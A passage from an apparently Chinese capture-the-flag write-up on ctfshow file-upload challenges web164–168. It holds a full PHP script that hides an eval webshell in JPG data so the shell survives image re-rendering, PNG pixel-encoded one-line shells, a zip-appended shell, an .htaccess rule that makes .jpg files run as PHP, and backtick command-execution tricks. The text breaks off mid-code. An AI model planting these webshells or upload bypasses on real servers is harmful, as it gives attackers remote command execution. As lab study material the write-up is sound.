class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//要修改的图片的路径</span> <span class="token comment">/* 木马内容&lt;?$_GET[0]($_POST[1]);?> */</span><span class="token comment">//imagepng($img,'1.png');  要修改的图片的路径,1.png是使用的文件，可以不存在</span><span class="token comment">//会在目录下自动创建一个1.png图片</span><span class="token comment">//图片脚本内容：$_GET[0]($_POST[1]);</span><span class="token comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span> <span class="token delimiter important">?></span></span>------------------------------------           创建1.png图片成功！      ------------------------------------</code></pre><p><img src="web164.png" loading="lazy"></p><h4 id="web165-jpg二次渲染"><a href="#web165-jpg二次渲染" class="headerlink" title="web165(jpg二次渲染)"></a>web165(jpg二次渲染)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg>    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=eval(\$_POST[7]);?>"</span><span class="token punctuation">;</span> <span class="token comment">//注意$转义</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>找了好久才找到可以通过的马</p><p><strong>渲染前</strong></p><p><img src="3_first.jpg" loading="lazy"><em>渲染前</em></p><p><strong>渲染后</strong></p><p><img src="3_second.jpg" loading="lazy"><em>渲染后</em></p><p><img src="web165.png" alt="image-20240702212536949" loading="lazy"></p><h4 id="web166-zip追加马"><a href="#web166-zip追加马" class="headerlink" title="web166(zip追加马)"></a>web166(zip追加马)</h4><p>只允许上传zip文件，随便上传一个，然后内容改为一句话木马即可，我在上传时，还有MIME检测所以也需要改</p><p><code>Content-Type=appliaction/x-zip-compressed</code></p><p><img src="web166.png" loading="lazy"></p><p>最后点击下载文件，抓包后发起POST请求得到flag</p><p><img src="web166_2.png" loading="lazy"></p><h4 id="web167-htaccess"><a href="#web167-htaccess" class="headerlink" title="web167(.htaccess)"></a>web167(.htaccess)</h4><p>那应该和apache有关，主要利用.htaccess进行绕过了</p><p><strong>.htaccess文件</strong></p><blockquote><p>htaccess 在站点的根目录下面，不是在apache目录下，但是它属于apache的一个配置文件</p></blockquote><blockquote><p>htaccess文件时Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301</p><p>重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</p></blockquote><blockquote><p>其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文</p><p>件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p></blockquote><p>首先上传.htaccess</p><p><code>AddType application/x-httpd-php .jpg</code> &#x2F;&#x2F;将.jpg后缀的文件解析成php</p><p>然后再上传1.jpg，里面加上马的内容，之后直接访问xxx&#x2F;upload&#x2F;1.jpg即可</p><h4 id="web168-后门免杀"><a href="#web168-后门免杀" class="headerlink" title="web168(后门免杀)"></a>web168(后门免杀)</h4><p><strong>基础免杀</strong></p><p>测试，会检测<code>_GET</code>、<code>_POST</code>。</p><p>可抓包后修改直接上传php文件。</p><p><strong>反引号</strong></p><p>反引号达到命令执行的效果。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`whoami`</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_</span><span class="token punctuation">;</span><span class="token comment">// &lt;?= `whoami`</span><span class="token delimiter important">?></span></span></code></pre><p>把源码拔下来</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-24 19:34:52# @Last Modified by:   h1xa# @Last Modified time: 2020-10-30 00:11:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token 